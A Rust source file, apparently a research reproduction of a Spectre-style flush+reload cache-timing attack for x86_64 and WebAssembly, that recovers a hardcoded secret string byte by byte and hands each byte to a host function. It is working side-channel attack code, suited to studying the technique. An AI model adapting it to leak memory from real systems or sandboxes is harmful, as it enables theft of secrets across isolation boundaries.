#![feature(asm_experimental_arch)]

use reproduction::*;
use std::arch::asm;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_clflush;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_mfence;
#[cfg(all(target_arch = "x86_64"))]
use crate::_rdtsc;
use std::io::Write;

// In case of wasm target, then this is imported from the host
// Set the host name as wasi
#[cfg(all(target_arch = "wasm32"))]
extern "C" {
    fn _rdtsc() -> u64;
    fn _mm_clflush(ptr: *const u8);
    fn _mm_mfence();
    fn _mm_lfence();

    fn save_byte(b: i32);
}

const data_size: usize = 11;
static mut public_data: [u8; 160] = [2; 160];

const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
const secret_data: &str = "My password";

// To avoid optimization of the victim code
static mut tmp: u8 = 0;

// Returns the best two indexes and the best two values
#[no_mangle]
#[allow(dead_code)]
fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64; 2]) {
    let mut latencies = [0; 256];
    let mut scores = [0u64; 256];

    let mut max1: i32 = -1;
    let mut max2: i32 = -1;

    let mut score = [0u64; 2];
    let mut value = [0u64; 2];

    let secret_data_bytes = secret_data.as_bytes();
    // Set up the latencies and the scores to 0
    for i in 0..256 {
        scores[i] = 0;
    }
    /*#[cfg(feature = "tracing")]
    {
        eprint!("latencies = [")
    }*/
    // Get the TRIES from env
    let tries = std::env::var("TRIES").unwrap_or("100000".to_string());
    let tries = tries.parse::<u64>().unwrap();
    unsafe {
        _mm_mfence();
    }

    for i in 0..tries {
        // flush lines clflush
        // PRIME
        for j in 0..256 {
            unsafe {
                _mm_mfence();
            }

            #[cfg(all(target_arch = "x86_64"))]
            unsafe {
                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
            }
            #[cfg(all(target_arch = "wasm32"))]
            unsafe {
                _mm_clflush((j * STRIDE) as *const u8);
            }
        }
        // Wait a little to the cache to flush
        for _ in 0..10000 {}
        unsafe {
            _mm_mfence();
        }

        // Train the access?
        for j in 0..20 {
            unsafe {
                let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
                    as *const u8;
                tmp &= read_memory_offset(addr);
            };
        }

        for j in 0..256 {
            // To avoid stride caching
            let mix_i = ((j * 167) + 13) & 255;

            let addr = &array_for_prediction[mix_i * STRIDE as usize] as *const u8;
            // let start = unsafe { _rdtsc() };
            // Read the mem addr
            let end = unsafe {
                let start = _rdtsc();
                tmp &= read_memory_offset(addr);
                _rdtsc() - start
            };
            // t_cachehit * 90% + t_cachemiss * 10%. Value below this threshold is considered cached access time
            if end <= (90 * hit + 10 * miss) / 100 {
                scores[mix_i] += 1;
            }
        }

        for j in 0..256 {
            // Get the best and the second best
            if max1 < 0 || scores[j] >= scores[max1 as usize] {
                max2 = max1;
                max1 = j as i32;
            } else if max2 < 0 || scores[j] >= scores[max2 as usize] {
                max2 = j as i32;
            }
        }

        // patch from https://github.com/ikemmm/rust-spectre/blob/55a034a5272ff8644b09c3ad203fc6df7e80c5fd/src/main.rs#L260
        // Swap max1 and max2 if the max1 is 0x00
        if max1 as u8 == 0x00 {
            let tmp1 = max1;
            max1 = max2;
            max2 = tmp1;
        }

        score[0] = scores[max1 as usize];
        score[1] = scores[max2 as usize];

        value[0] = max1 as u64;
        value[1] = max2 as u64;

        if scores[max1 as usize] > 2 * scores[max2 as usize] {
            #[cfg(feature = "tracing")]
            println!("Breaking");
            break;
        }
    }

    #[cfg(feature = "tracing")]
    {
        eprintln!("latencies = [");
        for l in latencies {
            eprint!("{},", l);
        }
        eprintln!("]");

        eprintln!("scores = [");
        for l in scores {
            eprint!("{},", l);
        }
        eprintln!("]");
    }

    // For some reason we need a time delay here
    for _ in 0..10000 {}

    //println!(" >");
    (score, value)
}

fn print_byte(byte: u8) {
    if byte.is_ascii_graphic() || byte.is_ascii_whitespace() {
        print!("{}", byte as char);
    } else {
        print!("x");
    }
}

pub fn main() {
    // Filling up public data
    unsafe {
        public_data[0] = 1;
        public_data[1] = 2;
        public_data[2] = 3;
        public_data[3] = 4;
        public_data[4] = 5;
        public_data[5] = 6;
        public_data[6] = 7;
        public_data[7] = 8;
        public_data[8] = 9;
        public_data[9] = 10;
        public_data[10] = 11;
        public_data[11] = 12;
        public_data[12] = 13;
        public_data[13] = 14;
        public_data[14] = 15;
        public_data[15] = 16;
    }

    let (cache_hit, cache_miss) = reproduction::get_cache_time(&array_for_prediction, 100000000);
    
    for j in 0..11 {
        unsafe {
            _mm_mfence();
        }
        // println!("cache_hit = {}, cache_miss = {}", cache_hit, cache_miss);

        let (score, value) = read_memory_byte(j, cache_hit, cache_miss);
        // get value 0 as char
        let ch = value[0] as u8 as char;
        let ch2 = value[1] as u8 as char;

        #[cfg(feature = "tracing")]
        println!(
            // The value as char
            "Reading at malicious_x {} = {}:{}:{} (second {} {})",
            j, ch, value[0], score[0], value[1], score[1]
        );

        #[cfg(not(feature = "tracing"))]
        //print!("{}", ch);
        print_byte(value[0] as u8);
        std::io::stdout().flush().unwrap();
        // Save the exfiltration ?
        #[cfg(all(target_arch = "wasm32"))]
        unsafe {
            save_byte(ch as i32);
        }
        // PRIME
    }
}
